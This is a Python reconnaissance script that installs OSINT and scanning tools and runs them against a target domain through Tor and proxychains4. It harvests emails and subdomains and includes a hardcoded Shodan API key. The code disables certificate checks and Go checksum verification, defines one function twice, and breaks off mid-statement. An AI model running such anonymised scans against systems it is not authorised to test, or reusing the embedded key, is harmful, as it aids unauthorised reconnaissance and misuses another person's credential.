#!/usr/bin/env python3
"""
Advanced Automated Reconnaissance Scanner v2.0 - Proxychains4 Support
Complete Web Reconnaissance & OSINT Tool
Every Tool with ALL Options
Anonymous Scanning with Proxychains4
"""

import subprocess
import os
import sys
import time
import json
import re
from datetime import datetime
import requests
import socket
import shutil          
import yaml
from urllib.parse import urlparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Color codes
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
# ============================================================
# ============ SHODAN API KEY (Set your key here) ============
SHODAN_API_KEY = "LUjtoxu27Ua7qf4YxBBMTdXzNevnmHRF"  # ← আপনার key
# ============================================================

class ReconScanner:
    def __init__(self, target, use_proxy=True):
        self.target = target
        self.clean_target = self.clean_url(target)
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.results_dir = f"recon_results_{self.timestamp}"
        self.subdomains = []
        self.live_hosts = []
        self.directories = []
        self.files = []
        self.ips = []
        self.urls = []
        self.open_ports = []
        self.installed_tools = []
        self.use_proxy = use_proxy
        self.proxy_prefix = "proxychains4 "
        self.proxy_config = "/etc/proxychains4.conf"
        self.shodan_api_key = SHODAN_API_KEY   

        os.makedirs(self.results_dir, exist_ok=True)

        self.tool_commands = {
            'proxychains4': 'sudo apt install proxychains-ng -y',
            'tor': 'sudo apt install tor -y',
            'gowitness': 'sudo apt install gowitness -y',
            'gobuster': 'sudo apt install gobuster -y',
            'dirb': 'sudo apt install dirb -y',
            'ffuf': 'sudo apt install ffuf -y',
            'searchsploit': 'sudo apt install exploitdb -y',
            'recon-ng': 'sudo apt install recon-ng -y',
            'whois': 'sudo apt install whois -y',
            'nmap': 'sudo apt install nmap -y',
            'curl': 'sudo apt install curl -y',
            'subfinder': 'go env -w GOPROXY=direct && go env -w GOSUMDB=off && go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
            'httpx': 'go env -w GOPROXY=direct && go env -w GOSUMDB=off && go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest',
            'katana': 'go env -w GOPROXY=direct && go env -w GOSUMDB=off && go install github.com/projectdiscovery/katana/cmd/katana@latest',
            'trufflehog': 'pip3 install trufflehog --break-system-packages',
            'githacker': 'pip3 install githacker --break-system-packages',
            'pagodo': 'cd /tmp && rm -rf pagodo && git clone https://github.com/opsdisk/pagodo.git && cd pagodo && pip3 install -r requirements.txt --break-system-packages && chmod +x pagodo.py && sudo ln -sf /tmp/pagodo/pagodo.py /usr/local/bin/pagodo && cd ~',
            'udork': 'cd /tmp && rm -rf uDork && git clone https://github.com/m3n0sd0n4ld/uDork.git && cd uDork && chmod +x uDork.sh && sudo cp uDork.sh /usr/local/bin/udork && cd ~',
            'theharvester': 'sudo apt install theharvester -y',
        }

    def clean_url(self, url):
        url = re.sub(r'^https?://', '', url)
        url = re.sub(r'^www\.', '', url)
        url = url.split('/')[0]
        return url

    def check_dependencies(self):
        print(f"\n{Colors.CYAN}📦 Checking dependencies...{Colors.RESET}")
        subprocess.run("sudo apt update -y", shell=True, check=False, capture_output=True)
        
        try:
            subprocess.run(['go', 'version'], capture_output=True, check=True)
            print(f"{Colors.GREEN}✅ Go is installed{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}⚠️ Installing Go...{Colors.RESET}")
            subprocess.run("sudo apt install golang-go -y", shell=True, check=False)
        
        try:
            subprocess.run(['git', '--version'], capture_output=True, check=True)
            print(f"{Colors.GREEN}✅ Git is installed{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}⚠️ Installing Git...{Colors.RESET}")
            subprocess.run("sudo apt install git -y", shell=True, check=False)
        
        try:
            subprocess.run(['pip3', '--version'], capture_output=True, check=True)
            print(f"{Colors.GREEN}✅ pip3 is installed{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}⚠️ Installing pip3...{Colors.RESET}")
            subprocess.run("sudo apt install python3-pip -y", shell=True, check=False)

    def setup_proxy(self):
        print(f"\n{Colors.MAGENTA}🔒 SETTING UP PROXYCHAINS4 & TOR{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}")

        if not self.check_and_install_tool('proxychains4'):
            print(f"{Colors.YELLOW}📥 Installing proxychains-ng...{Colors.RESET}")
            self.run_install_command("sudo apt install proxychains-ng -y", "proxychains-ng")
            if not self.check_and_install_tool('proxychains4'):
                print(f"{Colors.RED}❌ Proxychains4 not available{Colors.RESET}")
                self.use_proxy = False
                return False

        if not self.check_and_install_tool('tor'):
            print(f"{Colors.YELLOW}⚠️ Tor not installed. Installing...{Colors.RESET}")
            self.run_install_command("sudo apt install tor -y", "Tor")

        print(f"{Colors.CYAN}🔄 Starting Tor service...{Colors.RESET}")
        try:
            subprocess.run(["sudo", "systemctl", "start", "tor"], check=True)
            subprocess.run(["sudo", "systemctl", "enable", "tor"], check=True)
            print(f"{Colors.GREEN}✅ Tor service started{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}⚠️ Could not start Tor. Try: sudo systemctl start tor{Colors.RESET}")

        config_paths = ["/etc/proxychains4.conf", "/etc/proxychains.conf"]
        found_config = False
        for config_path in config_paths:
            if os.path.exists(config_path):
                try:
                    with open(config_path, 'r') as f:
                        content = f.read()
                        if 'socks4' in content or 'socks5' in content or 'http' in content:
                            print(f"{Colors.GREEN}✅ Proxychains4 configured at: {config_path}{Colors.RESET}")
                            self.proxy_config = config_path
                            self.proxy_prefix = f"proxychains4 -f {config_path} "
                            found_config = True
                            break
                except:
                    pass

        if not found_config:
            custom_config = f"{self.results_dir}/proxychains4.conf"
            config_content = """
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
localnet ::1/128
socks5 127.0.0.1 9050
socks4 127.0.0.1 9050
http 127.0.0.1 8118
"""
            with open(custom_config, 'w') as f:
                f.write(config_content)
            self.proxy_config = custom_config
            self.proxy_prefix = f"proxychains4 -f {custom_config} "
            print(f"{Colors.GREEN}✅ Custom proxychains4 config created: {custom_config}{Colors.RESET}")

        self.test_proxy_connection()
        return True

    def test_proxy_connection(self):
        print(f"\n{Colors.CYAN}🔍 Testing proxychains4 connection...{Colors.RESET}")
        try:
            cmd = f"{self.proxy_prefix} curl -s --max-time 10 http://httpbin.org/ip"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0 and result.stdout:
                print(f"{Colors.GREEN}✅ Proxychains4 is working!{Colors.RESET}")
                print(f"{Colors.BLUE}   IP via proxy: {result.stdout.strip()}{Colors.RESET}")
                return True
        except:
            pass

        print(f"{Colors.RED}❌ Proxychains4 not working.{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️ Make sure Tor is running: sudo systemctl start tor{Colors.RESET}")
        self.use_proxy = False
        self.proxy_prefix = ""
        return False

    def run_with_proxy(self, cmd):
        if self.use_proxy and not any(tool in cmd for tool in ['subfinder']):
            return f"{self.proxy_prefix}{cmd}"
        return cmd

    def install_all_tools(self):
        print(f"\n{Colors.MAGENTA}🔧 INSTALLING REQUIRED TOOLS{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}")

        print(f"{Colors.CYAN}📦 Updating package list...{Colors.RESET}")
        self.run_install_command("sudo apt update -y", "apt update")

        print(f"{Colors.CYAN}📦 Checking Go installation...{Colors.RESET}")
        try:
            subprocess.run(['go', 'version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}✅ Go is installed{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}⚠️ Go not found. Installing Go...{Colors.RESET}")
            self.run_install_command("sudo apt install golang-go -y", "Go")
            # Set PATH for Go
            os.environ['PATH'] += os.pathsep + os.path.expanduser('~/go/bin')
            os.environ['PATH'] += os.pathsep + "/usr/local/go/bin"

        # ============ FIX: Set PATH for Go binaries ============
        go_bin = os.path.expanduser("~/go/bin")
        if go_bin not in os.environ['PATH']:
            os.environ['PATH'] = go_bin + os.pathsep + os.environ['PATH']
            print(f"{Colors.CYAN}📦 Added {go_bin} to PATH{Colors.RESET}")
        
        # Add to ~/.bashrc for future sessions
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            with open(bashrc, 'r') as f:
                content = f.read()
            if 'export PATH=$PATH:~/go/bin' not in content:
                with open(bashrc, 'a') as f:
                    f.write('\n# Added for Go tools\nexport PATH=$PATH:~/go/bin\n')
                print(f"{Colors.GREEN}✅ Added ~/go/bin to ~/.bashrc{Colors.RESET}")
        except:
            pass

        print(f"{Colors.CYAN}📦 Checking Python pip...{Colors.RESET}")
        try:
            subprocess.run(['pip3', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}✅ pip3 is installed{Colors.RESET}")
        except:
            self.run_install_command("sudo apt install python3-pip -y", "pip3")

        print(f"{Colors.CYAN}📦 Installing Python packages...{Colors.RESET}")
        self.run_install_command("pip3 install requests PySocks --break-system-packages", "Python packages")

        print(f"\n{Colors.CYAN}📦 Installing all tools...{Colors.RESET}")
        for tool, cmd in self.tool_commands.items():
            print(f"\n{Colors.YELLOW}🔧 Installing {tool}...{Colors.RESET}")
            if self.install_tool(tool, cmd):
                self.installed_tools.append(tool)

        self.setup_proxy()
        print(f"\n{Colors.GREEN}✅ Tool installation complete!{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Installed tools: {', '.join(self.installed_tools)}{Colors.RESET}")
        print(f"{Colors.CYAN}🔒 Proxy enabled: {self.use_proxy}{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}")

    def install_tool(self, tool_name, install_cmd):
        try:
            # Check if already installed
            if tool_name in ['subfinder', 'httpx', 'katana']:
                try:
                    subprocess.run([tool_name, '-h'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
                    print(f"{Colors.GREEN}✅ {tool_name} already installed{Colors.RESET}")
                    return True
                except:
                    pass
            else:
                try:
                    subprocess.run([tool_name, '-h'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
                    print(f"{Colors.GREEN}✅ {tool_name} already installed{Colors.RESET}")
                    return True
                except:
                    pass

            print(f"{Colors.YELLOW}📥 Installing {tool_name}...{Colors.RESET}")
            result = subprocess.run(
                install_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=600
            )
            if result.returncode == 0:
                print(f"{Colors.GREEN}✅ {tool_name} installed successfully{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}❌ Failed to install {tool_name}{Colors.RESET}")
                if result.stderr:
                    print(f"{Colors.RED}   Error: {result.stderr[:100]}{Colors.RESET}")
                return False
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}❌ Installation timed out for {tool_name}{Colors.RESET}")
            return False
        except Exception as e:
            print(f"{Colors.RED}❌ Error installing {tool_name}: {str(e)[:50]}{Colors.RESET}")
            return False

    def run_install_command(self, cmd, name):
        print(f"{Colors.CYAN}📥 Installing {name}...{Colors.RESET}")
        try:
            timeout = 600 if 'git clone' in cmd else 300
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            if result.returncode == 0:
                print(f"{Colors.GREEN}✅ {name} installed successfully{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}❌ Failed to install {name}{Colors.RESET}")
                if result.stderr:
                    error_lines = result.stderr.split('\n')
                    for line in error_lines[:3]:
                        if 'ERROR' in line or 'error' in line:
                            print(f"{Colors.RED}   {line[:150]}{Colors.RESET}")
                return False
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}❌ Installation timed out for {name}{Colors.RESET}")
            return False
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {str(e)[:100]}{Colors.RESET}")
            return False

    def check_and_install_tool(self, tool_name):
        try:
            subprocess.run([tool_name, '-h'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except:
            print(f"{Colors.YELLOW}⚠️ {tool_name} not found{Colors.RESET}")
            print(f"{Colors.CYAN}📥 Installing {tool_name}...{Colors.RESET}")
            if tool_name in self.tool_commands:
                return self.install_tool(tool_name, self.tool_commands[tool_name])
            else:
                print(f"{Colors.RED}❌ No installation command for {tool_name}{Colors.RESET}")
                return False

    def run_command(self, cmd, description, use_proxy=True):
        print(f"{Colors.CYAN}▶️ {description}{Colors.RESET}")
        if use_proxy and self.use_proxy:
            full_cmd = self.run_with_proxy(cmd)
        else:
            full_cmd = cmd
        print(f"{Colors.YELLOW}   CMD: {full_cmd[:150]}...{Colors.RESET}")
        try:
            result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=600)
            if result.returncode == 0:
                print(f"{Colors.GREEN}✅ Success{Colors.RESET}")
                return result.stdout
            else:
                print(f"{Colors.RED}❌ Failed (exit code: {result.returncode}){Colors.RESET}")
                if result.stderr:
                    print(f"{Colors.RED}   Error: {result.stderr[:100]}{Colors.RESET}")
                return None
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}❌ Timed out{Colors.RESET}")
            return None
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {str(e)[:50]}{Colors.RESET}")
            return None
    def check_and_install_seclists(self):
        """Check and install Seclists if not present"""
        print(f"\n{Colors.CYAN}📦 Checking SecLists...{Colors.RESET}")
        
        # Common Seclists paths
        seclists_paths = [
            "/usr/share/seclists",
            "/usr/share/wordlists/seclists",
            "/opt/seclists"
        ]
        
        seclists_found = False
        for path in seclists_paths:
            if os.path.exists(path):
                print(f"{Colors.GREEN}✅ SecLists found at: {path}{Colors.RESET}")
                seclists_found = True
                break
        
        if not seclists_found:
            print(f"{Colors.YELLOW}⚠️ SecLists not found. Installing...{Colors.RESET}")
            
            # Try apt install first
            try:
                print(f"{Colors.CYAN}📥 Installing SecLists via apt...{Colors.RESET}")
                result = subprocess.run("sudo apt install seclists -y", shell=True, capture_output=True, text=True, timeout=300)
                if result.returncode == 0:
                    print(f"{Colors.GREEN}✅ SecLists installed via apt{Colors.RESET}")
                    return True
                else:
                    print(f"{Colors.YELLOW}⚠️ apt install failed, trying GitHub...{Colors.RESET}")
            except:
                pass
            
            # If apt fails, clone from GitHub
            try:
                print(f"{Colors.CYAN}📥 Downloading SecLists from GitHub...{Colors.RESET}")
                subprocess.run("sudo rm -rf /usr/share/seclists", shell=True, check=False)
                clone_cmd = "sudo git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists"
                result = subprocess.run(clone_cmd, shell=True, capture_output=True, text=True, timeout=600)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}✅ SecLists downloaded from GitHub{Colors.RESET}")
                    return True
                else:
                    print(f"{Colors.RED}❌ Failed to download SecLists{Colors.RESET}")
                    if result.stderr:
                        print(f"{Colors.RED}   Error: {result.stderr[:200]}{Colors.RESET}")
                    return False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {str(e)[:100]}{Colors.RESET}")
                return False
        
        return True

    def get_wordlist(self):
        """Get available wordlist"""
        wordlists = [
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
        ]
        
        for wl in wordlists:
            if os.path.exists(wl):
                return wl
        
        fallback = f"{self.results_dir}/fallback.txt"
        with open(fallback, 'w') as f:
            words = ["admin", "login", "test", "dev", "api", "blog", "shop", "backup", "old", "new"]
            for w in words:
                f.write(f"{w}\n")
        return fallback

    def get_wordlist(self, name):
        """Get wordlist path with fallback options"""
        wordlists = {
            'common': [
                "/usr/share/seclists/Discovery/Web-Content/common.txt",
                "/usr/share/wordlists/dirb/common.txt",
                "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            ],
            'dirb': [
                "/usr/share/wordlists/dirb/common.txt",
                "/usr/share/seclists/Discovery/Web-Content/common.txt"
            ],
            'dirbuster': [
                "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
                "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
            ],
            'small': [
                "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt",
                "/usr/share/wordlists/dirb/common.txt"
            ]
        }
        
        for path in wordlists.get(name, []):
            if os.path.exists(path):
                return path
        
        # Create fallback wordlist if none exists
        fallback = f"{self.results_dir}/fallback_wordlist.txt"
        if not os.path.exists(fallback):
            with open(fallback, 'w') as f:
                f.write("admin\nlogin\ntest\ndev\napi\nblog\nshop\nbackup\nold\nnew\n")
        return fallback



    # ==================== THEHARVESTER - OSINT EMAIL & SUBDOMAIN HARVESTING ====================
    def run_theharvester_all(self):
        """Run theHarvester with multiple sources, live output, and summary report"""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}🔍 THEHARVESTER - OSINT EMAIL & SUBDOMAIN HARVESTING{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        # ============ Check/Install theHarvester ============
        if not shutil.which("theHarvester"):
            print(f"{Colors.YELLOW}⚠️ theHarvester not found. Installing...{Colors.RESET}")
            self.run_install_command("sudo apt install theharvester -y", "theHarvester")
            if not shutil.which("theHarvester"):
                print(f"{Colors.RED}❌ theHarvester installation failed.{Colors.RESET}")
                return

        print(f"{Colors.GREEN}✅ theHarvester is installed{Colors.RESET}")

        # ============ Configure Shodan API key ============
        shodan_key = self._get_shodan_api_key()
        if shodan_key:
            self._configure_shodan_key(shodan_key)
            print(f"{Colors.GREEN}✅ Shodan API key configured{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️ No Shodan API key found. Shodan tests will be skipped.{Colors.RESET}")

        # ============ Define test cases (12 tests, like before) ============
        tests = [
            {'name': '01_Crtsh', 'desc': 'Certificate Transparency logs', 'source': 'crtsh'},
            {'name': '02_HackerTarget', 'desc': 'HackerTarget API', 'source': 'hackertarget'},
            {'name': '03_DuckDuckGo', 'desc': 'DuckDuckGo search (emails)', 'source': 'duckduckgo'},
            {'name': '04_DNSDumpster', 'desc': 'DNSDumpster (subdomains & DNS)', 'source': 'dnsdumpster'},
            {'name': '05_ThreatCrowd', 'desc': 'ThreatCrowd (subdomains & emails)', 'source': 'threatcrowd'},
            {'name': '06_URLScan', 'desc': 'URLScan.io (domains & subdomains)', 'source': 'urlscan'},
            {'name': '07_WaybackArchive', 'desc': 'Wayback Machine (historical URLs)', 'source': 'waybackarchive'},
            {'name': '08_Shodan', 'desc': 'Shodan (IPs & hosts)', 'source': 'shodan'},
            {'name': '09_Multi_Source', 'desc': 'Combine crtsh,hackertarget,duckduckgo', 'source': 'crtsh,hackertarget,duckduckgo'},
            {'name': '10_DNS_Brute', 'desc': 'DNS brute force with resolution', 'source': 'crtsh', 'extra': '-c -t -r'},
            {'name': '11_Takeover_Check', 'desc': 'Subdomain takeover check', 'source': 'crtsh,hackertarget', 'extra': '-t'},
            {'name': '12_All_Sources', 'desc': 'All supported sources', 'source': 'crtsh,hackertarget,duckduckgo,dnsdumpster,threatcrowd,urlscan,waybackarchive'}
        ]

        # If Shodan key exists, add it to "All Sources"
        if shodan_key:
            tests[-1]['source'] += ',shodan'

        # ============ Run each test with LIVE OUTPUT ============
        all_emails = set()
        all_subdomains = set()
        all_hosts = set()
        successful = 0
        total = len(tests)

        for test in tests:
            print(f"\n{Colors.CYAN}📝 Test: {test['name']}{Colors.RESET}")
            print(f"{Colors.BLUE}   {test['desc']}{Colors.RESET}")

            # Build command - NO REDIRECTION (so we can read stdout live)
            cmd = f"theHarvester -d {self.clean_target} -l 50 -b {test['source']}"
            if test.get('extra'):
                cmd += f" {test['extra']}"
            if self.use_proxy:
                cmd = f"{self.proxy_prefix} {cmd}"

            print(f"{Colors.YELLOW}   CMD: {cmd[:150]}...{Colors.RESET}")

            # Output file for saving (but we also read from pipe)
            output_file = f"{self.results_dir}/theharvester_{test['name']}.txt"

            try:
                start_time = time.time()
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )

                output_lines = []

                while True:
                    line = process.stdout.readline()
                    if line == '' and process.poll() is not None:
                        break
                    if line:
                        line = line.rstrip()
                        output_lines.append(line)

                        # ----- PARSE AND PRINT LIVE -----
                        # Emails
                        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', line)
                        for email in emails:
                            if email not in all_emails:
                                all_emails.add(email)
                                print(f"{Colors.CYAN}      📧 {email}{Colors.RESET}")

                        # Hosts/subdomains
                        if 'Found' in line and ('host' in line.lower() or 'subdomain' in line.lower()):
                            host_match = re.search(r'Found:\s*([a-zA-Z0-9.-]+)', line, re.I)
                            if host_match:
                                host = host_match.group(1)
                                if host not in all_hosts:
                                    all_hosts.add(host)
                                    if host.endswith(self.clean_target):
                                        all_subdomains.add(host)
                                    print(f"{Colors.GREEN}      🌐 {host}{Colors.RESET}")

                        # Progress / Info
                        elif 'Searching' in line or 'Harvesting' in line:
                            print(f"{Colors.YELLOW}      🔄 {line}{Colors.RESET}")

                        # Error / Warning
                        elif 'error' in line.lower() or 'fail' in line.lower():
                            print(f"{Colors.RED}      ❌ {line}{Colors.RESET}")
                        elif 'warning' in line.lower():
                            print(f"{Colors.YELLOW}      ⚠️ {line}{Colors.RESET}")

                        # Summary lines from theHarvester
                        elif 'Emails' in line or 'Total' in line or 'Hosts found' in line:
                            print(f"{Colors.GREEN}      📊 {line}{Colors.RESET}")

                        # Missing Shodan key message
                        elif 'Missing API key for Shodan' in line:
                            print(f"{Colors.YELLOW}      ⚠️ {line}{Colors.RESET}")

                        # Default: show any other non-empty line
                        else:
                            if line.strip():
                                print(f"      {line}")

                elapsed = time.time() - start_time

                # Save output to file
                with open(output_file, 'w') as f:
                    f.write('\n'.join(output_lines))

                print(f"{Colors.GREEN}   ✅ Completed in {elapsed:.2f}s. Saved to {output_file}{Colors.RESET}")
                successful += 1

            except Exception as e:
                print(f"{Colors.RED}   ❌ Test failed: {e}{Colors.RESET}")

        # ============ Final Summary ============
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 THEHARVESTER SUMMARY{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}Total tests: {total}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Successful: {successful}{Colors.RESET}")
        print(f"{Colors.RED}❌ Failed: {total - successful}{Colors.RESET}")

        print(f"\n{Colors.CYAN}📧 Emails Found: {len(all_emails)}{Colors.RESET}")
        for email in sorted(all_emails)[:20]:
            print(f"   {Colors.BLUE}• {email}{Colors.RESET}")
        if len(all_emails) > 20:
            print(f"   {Colors.YELLOW}... and {len(all_emails)-20} more{Colors.RESET}")

        print(f"\n{Colors.CYAN}🌐 Subdomains Found: {len(all_subdomains)}{Colors.RESET}")
        for sub in sorted(all_subdomains)[:20]:
            print(f"   {Colors.GREEN}• {sub}{Colors.RESET}")
        if len(all_subdomains) > 20:
            print(f"   {Colors.YELLOW}... and {len(all_subdomains)-20} more{Colors.RESET}")

        # Save combined results
        if all_emails:
            with open(f"{self.results_dir}/theharvester_emails.txt", 'w') as f:
                for email in sorted(all_emails):
                    f.write(f"{email}\n")
            print(f"{Colors.CYAN}📁 Emails saved to {self.results_dir}/theharvester_emails.txt{Colors.RESET}")

        if all_subdomains:
            with open(f"{self.results_dir}/theharvester_subdomains.txt", 'w') as f:
                for sub in sorted(all_subdomains):
                    f.write(f"{sub}\n")
            print(f"{Colors.CYAN}📁 Subdomains saved to {self.results_dir}/theharvester_subdomains.txt{Colors.RESET}")

        self.subdomains.extend(all_subdomains)
        self.ips.extend(all_hosts)

        print(f"\n{Colors.GREEN}✅ theHarvester scan complete!{Colors.RESET}")

    def _get_shodan_api_key(self):
        # প্রথমে ক্লাস ভেরিয়েবল
        if hasattr(self, 'shodan_api_key') and self.shodan_api_key and self.shodan_api_key != "YOUR_SHODAN_API_KEY_HERE":
            return self.shodan_api_key
        # তারপর env
        key = os.environ.get('SHODAN_API_KEY')
        if key:
            return key
        # তারপর ফাইল
        config_path = os.path.expanduser("~/.shodan_api_key")
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                return f.read().strip()
        return None

    def _configure_shodan_key(self, api_key):
        """Write Shodan key to theHarvester config file"""
        try:
            import yaml
            config_file = "/etc/theHarvester/api-keys.yaml"
            if not os.path.exists(config_file):
                # Create default config
                config = {}
            else:
                with open(config_file, 'r') as f:
                    config = yaml.safe_load(f) or {}
            config['shodan'] = api_key
            config['shodan_internetdb'] = api_key
            temp_file = "/tmp/api-keys.yaml"
            with open(temp_file, 'w') as f:
                yaml.dump(config, f, default_flow_style=False)
            subprocess.run(f"sudo cp {temp_file} {config_file}", shell=True, check=False)
            subprocess.run(f"sudo chmod 644 {config_file}", shell=True, check=False)
            os.remove(temp_file)
        except Exception as e:
            print(f"{Colors.YELLOW}⚠️ Could not configure Shodan key automatically: {e}{Colors.RESET}")
            print(f"{Colors.YELLOW}   Please manually add 'shodan: \"YOUR_KEY\"' to /etc/theHarvester/api-keys.yaml{Colors.RESET}")

    # ==================== DMITRY - INFORMATION GATHERING ====================
    # ==================== DMITRY - COMPLETE WITH ALL OPTIONS ====================
    def run_dmitry_all(self):
        """Dmitry - Complete ALL Options with Live Output"""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}🔍 DMITRY - COMPLETE INFORMATION GATHERING (ALL OPTIONS){Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        # Check if Dmitry is installed
        if not self.check_and_install_tool('dmitry'):
            print(f"{Colors.RED}❌ Dmitry not available. Installing...{Colors.RESET}")
            self.run_install_command("sudo apt install dmitry -y", "dmitry")
            if not self.check_and_install_tool('dmitry'):
                print(f"{Colors.RED}❌ Dmitry installation failed{Colors.RESET}")
                return

        print(f"{Colors.GREEN}✅ Dmitry is installed{Colors.RESET}")
        print(f"{Colors.CYAN}📋 Target: {self.clean_target}{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}")

        # ============================================================
        # ALL DMITRY OPTIONS - Complete List
        # ============================================================
        
        dmitry_tests = [
            {
                'name': '01_Whois_Lookup',
                'desc': 'WHOIS information of domain',
                'flag': '-w',
                'output': 'dmitry_whois.txt'
            },
            {
                'name': '02_IP_Information',
                'desc': 'IP information and geolocation',
                'flag': '-i',
                'output': 'dmitry_ip_info.txt'
            },
            {
                'name': '04_Netcraft_Info',
                'desc': 'Netcraft information (server, OS, hosting)',
                'flag': '-n',
                'output': 'dmitry_netcraft.txt'
            },
            {
                'name': '05_Email_Harvest',
                'desc': 'Harvest emails from domain',
                'flag': '-e',
                'output': 'dmitry_emails.txt'
            },
            {
                'name': '06_Full_Whois',
                'desc': 'Full WHOIS with netcraft',
                'flag': '-wn',
                'output': 'dmitry_full_whois.txt'
            },
            {
                'name': '15_Verbose_All',
                'desc': 'Verbose mode with all options',
                'flag': '-v -winpe',
                'output': 'dmitry_verbose.txt'
            },
            {
                'name': '16_Debug_All',
                'desc': 'Debug mode with all options',
                'flag': '-d -winpe',
                'output': 'dmitry_debug.txt'
            }
        ]

        successful = 0
        total = len(dmitry_tests)
        all_emails = []
        all_ports = []
        all_ips = []
        all_domains = []
        all_server_info = []
        
        # Create a combined output directory
        dmitry_dir = f"{self.results_dir}/dmitry"
        os.makedirs(dmitry_dir, exist_ok=True)

        for idx, test in enumerate(dmitry_tests, 1):
            print(f"\n{Colors.BOLD}{Colors.CYAN}📝 [{idx}/{total}] {test['name']}{Colors.RESET}")
            print(f"{Colors.BLUE}   {test['desc']}{Colors.RESET}")
            print(f"{Colors.BLUE}   Flag: {test['flag']}{Colors.RESET}")
            print(f"{Colors.YELLOW}{'─'*70}{Colors.RESET}")

            # Build command with output redirection
            output_file = f"{dmitry_dir}/{test['output']}"
            cmd = f"dmitry {test['flag']} {self.clean_target}"
            
            if self.use_proxy:
                full_cmd = f"{self.proxy_prefix} {cmd} 2>&1 | tee {output_file}"
            else:
                full_cmd = f"{cmd} 2>&1 | tee {output_file}"

            print(f"{Colors.YELLOW}   CMD: {full_cmd[:120]}...{Colors.RESET}")

            try:
                start_time = time.time()
                
                # ===== RUN WITH LIVE OUTPUT =====
                process = subprocess.Popen(
                    full_cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )

                output_lines = []
                import sys
                
                while True:
                    line = process.stdout.readline()
                    if line == '' and process.poll() is not None:
                        break
                    if line:
                        line = line.rstrip()
                        output_lines.append(line)
                        
                        # ===== COLORIZE LIVE OUTPUT =====
                        # Open ports
                        if 'open' in line.lower() and ('port' in line.lower() or 'tcp' in line.lower()):
                            if '111' in line:
                                print(f"{Colors.RED}      ⚠️ {line}{Colors.RESET}")
                                all_ports.append(111)
                            else:
                                print(f"{Colors.GREEN}      ✅ {line}{Colors.RESET}")
                                port_match = re.search(r'(\d+)/tcp', line)
                                if port_match:
                                    all_ports.append(int(port_match.group(1)))
                        
                        # Emails
                        elif '@' in line and ('.com' in line or '.org' in line or '.net' in line or '.uk' in line):
